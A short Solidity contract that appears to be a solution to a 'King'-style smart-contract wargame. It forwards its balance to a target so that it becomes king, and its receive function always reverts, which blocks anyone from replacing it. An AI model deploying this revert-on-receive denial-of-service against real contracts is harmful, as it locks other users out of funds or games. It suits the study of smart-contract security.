// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract IrreplaceableKing {

    address private king;

    constructor(address _king) payable {
        king = _king;
    }

    function becomeKing() public {
        uint balance = address(this).balance;
        (bool sent,) = payable(king).call{value: balance}("");
        require(sent, "Failed to transfer Ether");
    }

    receive() external payable {
        revert();
    }

}
